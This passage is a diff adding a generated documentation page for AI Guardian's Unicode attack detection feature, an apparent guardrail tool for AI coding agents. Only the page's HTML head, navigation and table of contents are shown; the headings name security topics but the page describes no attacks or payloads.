@@ -1,0 +1,3824 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Security guardrails for AI coding agents and IDE integrations">
+      
+      
+      
+        <link rel="canonical" href="https://ai-guardian.readthedocs.io/security/UNICODE_ATTACKS/">
+      
+      
+        <link rel="prev" href="../DIRECTORY_RULES/">
+      
+      
+        <link rel="next" href="../../SECURITY_DESIGN/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Unicode Attacks - AI Guardian</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/_mkdocstrings.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#unicode-based-attack-detection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="AI Guardian" class="md-header__button md-logo" aria-label="AI Guardian" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            AI Guardian
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Unicode Attacks
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/RedHatProductSecurity/ai-guardian" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    RedHatProductSecurity/ai-guardian
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="AI Guardian" class="md-nav__button md-logo" aria-label="AI Guardian" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    AI Guardian
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/RedHatProductSecurity/ai-guardian" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    RedHatProductSecurity/ai-guardian
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../.." class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Getting Started
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../documentation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Documentation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../DEVELOPER_GUIDE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Developer Install
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CONFIGURATION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../COOKBOOK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration Cookbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SCANNER_INSTALLATION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scanner Installation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TROUBLESHOOTING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Troubleshooting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Features
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Security Features
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SECRET_SCANNING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Secret Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SECRET_REDACTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Secret Redaction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PROMPT_INJECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prompt Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CONTEXT_POISONING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Context Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF_PROTECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IMAGE_SCANNING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PII and Image Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CREDENTIAL_EXFILTRATION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DIRECTORY_RULES/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Directory Rules
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unicode Attacks
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unicode Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-types-detected" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Types Detected
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Types Detected">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-zero-width-characters-invisible-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Zero-Width Characters (Invisible Characters)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-bidirectional-override-characters-text-reversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Bidirectional Override Characters (Text Reversal)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-tag-characters-hidden-data-encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Tag Characters (Hidden Data Encoding)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-homoglyphs-look-alike-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Homoglyphs (Look-Alike Characters)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Homoglyphs (Look-Alike Characters)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cyrillic-latin-most-common" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cyrillic → Latin (Most Common)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#greek-latin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Greek → Latin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mathematical-alphanumeric-latin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mathematical Alphanumeric → Latin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fullwidth-latin-ascii" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fullwidth Latin → ASCII
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cherokeecoptic-latin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cherokee/Coptic → Latin
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Configuration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration Options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#action-modes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Action Modes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#strict-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Strict Mode
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Examples
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection Examples">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#zero-width-character-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zero-Width Character Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bidirectional-override-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bidirectional Override Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#homoglyph-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Homoglyph Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Scenarios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-metadata-endpoint-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 1: Metadata Endpoint Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-visual-deception-in-code-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 2: Visual Deception in Code Review
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-allowlist-bypass-via-homoglyphs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 3: Allowlist Bypass via Homoglyphs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#integration-with-other-protections" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Integration with Other Protections
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Integration with Other Protections">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ssrf-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        + SSRF Protection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#prompt-injection-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        + Prompt Injection Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secret-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        + Secret Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#performance-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Performance Impact
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#false-positives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        False Positives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="False Positives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#legitimate-use-cases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Legitimate Use Cases
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reducing-false-positives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reducing False Positives
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Best Practices
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Best Practices">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#for-developers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Developers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-security-teams" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Security Teams
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-code-reviewers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Code Reviewers
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#research-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Research Background
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Technical Details
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Technical Details">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#character-detection-algorithm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Character Detection Algorithm
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#homoglyph-detection-algorithm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Homoglyph Detection Algorithm
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#see-also" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        See Also
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#version-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Version History
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SECURITY_DESIGN/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Design
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ANNOTATIONS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Inline Annotations
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
